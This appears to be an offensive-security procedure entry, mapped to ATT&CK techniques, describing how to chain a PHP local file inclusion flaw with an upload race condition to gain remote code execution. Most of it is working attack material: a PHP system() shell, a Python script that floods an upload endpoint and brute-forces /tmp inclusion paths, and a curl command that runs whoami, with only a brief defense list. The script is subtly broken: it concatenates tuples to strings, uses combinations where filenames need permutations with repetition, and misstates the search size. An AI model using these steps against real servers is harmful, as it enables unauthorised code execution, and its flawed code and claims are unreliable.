---
id: b7bbe4f4-0d1b-48e2-8adc-48b1d712a563
name: LFI-to-RCE-via-Upload-Race-Condition
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:58.508591+00:00'
updated_at: '2023-04-10T20:22:16.292488+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploit-Public-Facing-Application|T1190 - Exploit Public-Facing
    Application]]
  - '[[techniques/Ingress-Tool-Transfer|T1105 - Ingress Tool Transfer]]'
sub_techniques: []
tags:
  - '[[tags/File Inclusion]]'
  - '[[tags/LFI to RCE via upload (race)]]'
  - race-condition
  - file-upload
  - web-exploitation
commands: []
platforms:
  - Web
  - PHP
tools: []
validated: true
---

# LFI-to-RCE-via-Upload-Race-Condition

## Summary

This procedure exploits a race condition in a web application's file upload functionality combined with a Local File Inclusion (LFI) vulnerability to achieve remote code execution (RCE). By rapidly uploading a malicious PHP shell in a loop, the attacker overwhelms the cleanup mechanism, allowing the file to persist temporarily. The procedure then bruteforces possible temporary filenames to include and execute the shell via LFI, enabling arbitrary command execution on the server.

## Description

In vulnerable web applications, file uploads may be processed asynchronously, creating a window where the file is written to a temporary location (e.g., /tmp/) before validation or deletion. If an LFI vulnerability exists that allows inclusion of files from this directory, an attacker can upload a PHP shell repeatedly to exploit the race and then trigger its inclusion. This technique targets PHP-based applications where upload endpoints accept files without immediate execution checks, and LFI parameters (e.g., ?c=filename) can reference server paths. Success leads to RCE, such as running system commands. This is commonly seen in misconfigured CMS or custom upload handlers. The target environment is a web server with PHP, accessible upload form, and LFI endpoint.

## Requirements

1. Valid network access to the target web application (e.g., HTTP/HTTPS).
2. Identification of an upload endpoint that saves files to a predictable temporary directory (e.g., /tmp/).
3. Discovery of an LFI vulnerability allowing inclusion of arbitrary files (e.g., via a parameter like ?c=).
4. Python 3 environment with requests and itertools libraries installed (standard in most Python setups).
5. A simple PHP shell file prepared for upload.

## Defense

Defensive measures and detection strategies:

- Implement atomic file operations and immediate validation/deletion during uploads to prevent race conditions.
- Sanitize and restrict LFI parameters to prevent path traversal (e.g., whitelist allowed paths, use basename()).
- Store uploads outside the web root and scan for malicious content (e.g., PHP tags) before processing.
- Use a Web Application Firewall (WAF) to detect rapid upload requests or LFI patterns.
- Monitor server logs for high-volume POST requests to upload endpoints and anomalous file inclusions.
- Enable PHP security settings like disable_functions for system() and open_basedir restrictions.

## Objectives

1. Exploit the upload race condition to persist a malicious PHP shell on the server.
2. Use LFI to include and execute the uploaded shell, achieving RCE.
3. Verify execution by running a test command (e.g., uptime) and observing output.

## Instructions

### Step 1: Prepare the PHP Shell

**Context**: Create a minimal PHP shell that executes a test command to verify inclusion. This shell will be uploaded and checked for execution via its output.

Create a file named shell.php with the following content, referencing [[codes/PHP-Uptime-Test-Shell]]:

```php
<?php echo system('uptime');
```

> This one-liner executes the 'uptime' command when included, producing output containing 'load average' to confirm success. Place shell.php in your working directory for upload.

### Step 2: Prepare the Exploitation Script

**Context**: Set up the Python script that handles the race-condition upload and LFI bruteforce. This script must be customized with the target's URLs before execution.

Save the script as lfi_race.py, using the content from [[codes/LFI-RCE-Upload-Race-Exploitation-Script]]:

```python
import itertools
import requests
import sys
import string

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)

print('[x] Something went wrong, please try again')
```

> Edit the script to replace 'http://target.com/index.php?c=index.php' with the actual upload endpoint (POST) and 'http://target.com/index.php?c=/tmp/php' with the LFI base path (GET). The script assumes the temporary files are named phpXXXXXX (6 alphanumeric chars). Ensure Python 3 is available.

### Step 3: Execute the Upload Race

**Context**: Run the upload loop to exploit the race condition, flooding the server to allow the shell to persist in /tmp/ before cleanup.

Execute the script to perform the rapid uploads:

```bash
python3 lfi_race.py
```

> The script will output '[+] Trying to win the race' and loop 16,777,216 times (4096*4096) sending POST requests with the shell.php file. This may take several minutes depending on network latency and server response time. Monitor for errors like connection timeouts.

### Step 4: Bruteforce LFI Inclusion

**Context**: After uploads, the script automatically bruteforces possible filenames to find and include the persisted shell via LFI.

The script continues seamlessly to this phase, generating combinations of 6 alphanumeric characters for /tmp/phpXXXXXX and sending GET requests.

> Output will show '[+] Bruteforcing the inclusion'. If successful, it prints the working URL (e.g., http://target.com/index.php?c=/tmp/phpabc123) where 'load average' appears in the response, confirming RCE. If no match after all combinations (~36^6 attempts, but itertools optimizes), it errors out. Adjust filename pattern if /tmp/ naming differs (e.g., longer/shorter).

### Step 5: Interact with the Shell

**Context**: Once the inclusion URL is found, use it to execute arbitrary commands by modifying the shell or request.

Access the discovered URL in a browser or curl, appending ?cmd= for a more advanced shell if updated.

For example:

```bash
curl "http://target.com/index.php?c=/tmp/phpabc123&cmd=whoami"
```

> If the shell supports $_GET['cmd'], replace system('uptime') with system($_GET['cmd'] ?? 'uptime') in shell.php and re-run. Success shows command output, indicating full RCE control.
